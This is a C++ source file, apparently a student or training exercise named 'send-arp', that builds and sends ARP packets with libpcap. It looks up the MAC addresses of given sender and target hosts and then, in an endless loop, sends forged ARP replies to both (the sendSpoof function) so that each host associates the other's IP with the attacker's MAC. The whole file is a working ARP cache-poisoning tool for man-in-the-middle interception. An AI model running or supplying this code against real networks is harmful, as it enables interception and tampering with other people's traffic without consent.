#include <pcap.h>
#include <vector>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <cstring>
#include <cstdio>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("usage: send-arp <dev> <sender ip> <target ip> [...]\n");
}

Mac getMyMac(const char* dev) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        exit(1);
    }

    close(s);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

bool sendPacket(pcap_t* pcap, EthArpPacket& p) {
    int res = pcap_sendpacket(pcap, (const u_char*)&p, sizeof(p));
    if (res != 0) {
        fprintf(stderr, "send fail: %s\n", pcap_geterr(pcap));
        return false;
    }
    return true;
}

void sendArpRequest(pcap_t* pcap, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket p;
    p.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    p.eth_.smac_ = myMac;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_ = htons(ArpHdr::ETHER);
    p.arp_.pro_ = htons(EthHdr::Ip4);
    p.arp_.hln_ = Mac::Size;
    p.arp_.pln_ = Ip::Size;
    p.arp_.op_ = htons(ArpHdr::Request);

    p.arp_.smac_ = myMac;
    p.arp_.sip_ = htonl(myIp);
    p.arp_.tmac_ = Mac("00:00:00:00:00:00");
    p.arp_.tip_ = htonl(targetIp);

    sendPacket(pcap, p);
}

bool getMac(pcap_t* pcap, Ip ip, Mac& mac) {
    struct pcap_pkthdr* h;
    const u_char* pkt;

    for (int i = 0; i < 50; i++) {
        int res = pcap_next_ex(pcap, &h, &pkt);
        if (res <= 0) continue;

        if (h->caplen < sizeof(EthArpPacket)) continue;

        EthArpPacket* r = (EthArpPacket*)pkt;
        if (ntohs(r->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(r->arp_.op_) != ArpHdr::Reply) continue;

        if (r->arp_.sip_ == htonl(ip)) {
            mac = r->arp_.smac_;
            return true;
        }
    }
    return false;
}

void sendSpoof(pcap_t* pcap, Mac myMac, Mac victimMac, Ip fakeIp, Ip victimIp) {
    EthArpPacket p;

    p.eth_.dmac_ = victimMac;
    p.eth_.smac_ = myMac;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_ = htons(ArpHdr::ETHER);
    p.arp_.pro_ = htons(EthHdr::Ip4);
    p.arp_.hln_ = Mac::Size;
    p.arp_.pln_ = Ip::Size;
    p.arp_.op_ = htons(ArpHdr::Reply);

    p.arp_.smac_ = myMac;
    p.arp_.sip_ = htonl(fakeIp);
    p.arp_.tmac_ = victimMac;
    p.arp_.tip_ = htonl(victimIp);

    sendPacket(pcap, p);
}

struct Flow {
    Ip sender;
    Ip target;
    Mac senderMac;
    Mac targetMac;
};

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (!pcap) {
        fprintf(stderr, "pcap error: %s\n", errbuf);
        return 1;
    }

    Mac myMac = getMyMac(argv[1]);
    Ip myIp("0.0.0.0"); // 필요하면 확장

    std::vector<Flow> flows;

    for (int i = 2; i < argc; i += 2) {
        Flow f{ Ip(argv[i]), Ip(argv[i+1]) };

        sendArpRequest(pcap, myMac, myIp, f.sender);
        if (!getMac(pcap, f.sender, f.senderMac)) continue;

        sendArpRequest(pcap, myMac, myIp, f.target);
        if (!getMac(pcap, f.target, f.targetMac)) continue;

        flows.push_back(f);
    }

    while (true) {
        for (auto& f : flows) {
            sendSpoof(pcap, myMac, f.senderMac, f.target, f.sender);
            sendSpoof(pcap, myMac, f.targetMac, f.sender, f.target);
        }
        sleep(2);
    }
}
